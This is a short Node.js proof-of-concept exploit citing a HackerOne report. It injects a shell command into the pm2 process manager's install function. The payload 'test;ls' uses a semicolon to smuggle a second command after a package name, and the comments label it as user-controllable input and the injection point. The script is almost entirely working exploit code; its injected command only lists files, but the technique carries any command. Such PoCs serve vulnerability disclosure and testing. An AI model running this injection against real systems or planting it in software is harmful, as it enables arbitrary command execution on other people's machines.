//https://hackerone.com/reports/633364
"use strict";
const pm2 = require("pm2");

// payload - user controllable input
const payload = "test;ls";

pm2.connect(function (err) {
  if (err) {
    //console.error(err)
    process.exit(2);
  }

  pm2.start(
    {
      script: "app.js", // fake app.js to supress "No script path - aborting" error thrown from PM2
    },
    (err, apps) => {
      pm2.install(payload, {}); // injection
      pm2.disconnect();
      if (err) {
        throw err;
      }
    }
  );
});
